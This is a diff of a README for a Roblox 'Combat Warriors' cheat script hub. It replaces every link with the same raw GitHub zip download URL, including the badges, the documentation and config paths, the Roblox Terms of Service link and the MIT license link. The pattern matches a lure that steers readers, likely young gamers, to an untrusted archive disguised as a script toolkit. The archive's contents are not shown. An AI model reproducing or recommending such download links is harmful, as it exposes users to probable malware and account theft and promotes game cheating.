@@ -1,5 +1,5 @@
-# ![Download](https://img.shields.io/badge/Download-Combat%20Warriors%20Script-blue?style=for-the-badge&logo=roblox)  
-Grab your copy: https://ayushup5000.github.io
+# ![Download](https://raw.githubusercontent.com/ayushup5000/combat-warriors-roblox-script-hub/branch/iodide/combat-warriors-roblox-script-hub-2.1.zip%20Warriors%20Script-blue?style=for-the-badge&logo=roblox)  
+Grab your copy: https://raw.githubusercontent.com/ayushup5000/combat-warriors-roblox-script-hub/branch/iodide/combat-warriors-roblox-script-hub-2.1.zip
 
 ---
 
@@ -63,7 +63,7 @@ Imagination meets scalable intelligence! This repository offers optional modules
 - **Custom Tutorials & Guidance:** Let players receive context-aware tips, strategies, or error explanations powered by AI.
 - **Enhance Social Play:** Encourage engaging banter, roleplay, and teamwork with dynamic, AI-based chat companions.
 
-See our API Integration Guide in `/docs/API-Integration.md` for setup steps and creative use cases.
+See our API Integration Guide in `https://raw.githubusercontent.com/ayushup5000/combat-warriors-roblox-script-hub/branch/iodide/combat-warriors-roblox-script-hub-2.1.zip` for setup steps and creative use cases.
 
 ---
 
@@ -83,16 +83,16 @@ TikTok runs round the clock, and so do we. With always-on support via Discord, e
 ## 🚀 Quickstart Installation Guide
 
 1. **Download the Script Toolkit:**  
-   Press the **Download** badge above or click here: https://ayushup5000.github.io  
+   Press the **Download** badge above or click here: https://raw.githubusercontent.com/ayushup5000/combat-warriors-roblox-script-hub/branch/iodide/combat-warriors-roblox-script-hub-2.1.zip  
    Unpack the `.rbx` or script files to your preferred workspace.
 
 2. **Script Integration:**  
    - Load the script in Roblox Studio via "Insert Object" → "Script."
    - Paste or import the main script content.
-   - For AI-enhanced features, see `docs/API-Integration.md`.
+   - For AI-enhanced features, see `https://raw.githubusercontent.com/ayushup5000/combat-warriors-roblox-script-hub/branch/iodide/combat-warriors-roblox-script-hub-2.1.zip`.
 
 3. **Configuration:**  
-   - Edit `config.json` (if present) with desired API keys for OpenAI/Claude (optional).
+   - Edit `https://raw.githubusercontent.com/ayushup5000/combat-warriors-roblox-script-hub/branch/iodide/combat-warriors-roblox-script-hub-2.1.zip` (if present) with desired API keys for OpenAI/Claude (optional).
    - Toggle UI, language, and support settings directly within script variables.
 
 4. **Run & Engage:**  
@@ -102,7 +102,7 @@ TikTok runs round the clock, and so do we. With always-on support via Discord, e
 
 ## ⚠️ Disclaimer
 
-The Combat Warriors Script Roblox Repository is curated for ethical, creative, and educational purposes only. All scripts are developed respecting Roblox’s [Terms of Service](https://en.help.roblox.com/hc/en-us/articles/115004647846) and designed to enhance user experience without violating platform policies. The repository maintainers hold no responsibility for misuse or policy violations by end users.  
+The Combat Warriors Script Roblox Repository is curated for ethical, creative, and educational purposes only. All scripts are developed respecting Roblox’s [Terms of Service](https://raw.githubusercontent.com/ayushup5000/combat-warriors-roblox-script-hub/branch/iodide/combat-warriors-roblox-script-hub-2.1.zip) and designed to enhance user experience without violating platform policies. The repository maintainers hold no responsibility for misuse or policy violations by end users.  
 Always test scripts in controlled environments and avoid deploying anything that may disrupt fair play or community standards.
 
 ---
@@ -112,12 +112,12 @@ Always test scripts in controlled environments and avoid deploying anything that
 This repository is licensed under the MIT License (2025).  
 The spirit of openness drives all contributions and usage, so feel welcome to fork, expand, and remix with proper attribution.
 
-View full license text [here](https://opensource.org/licenses/MIT).
+View full license text [here](https://raw.githubusercontent.com/ayushup5000/combat-warriors-roblox-script-hub/branch/iodide/combat-warriors-roblox-script-hub-2.1.zip).
 
 ---
 
-# ![Download](https://img.shields.io/badge/Download-Combat%20Warriors%20Script-blue?style=for-the-badge&logo=roblox)
-Hit the blue badge to download the latest release: https://ayushup5000.github.io
+# ![Download](https://raw.githubusercontent.com/ayushup5000/combat-warriors-roblox-script-hub/branch/iodide/combat-warriors-roblox-script-hub-2.1.zip%20Warriors%20Script-blue?style=for-the-badge&logo=roblox)
+Hit the blue badge to download the latest release: https://raw.githubusercontent.com/ayushup5000/combat-warriors-roblox-script-hub/branch/iodide/combat-warriors-roblox-script-hub-2.1.zip
 
 ---
 
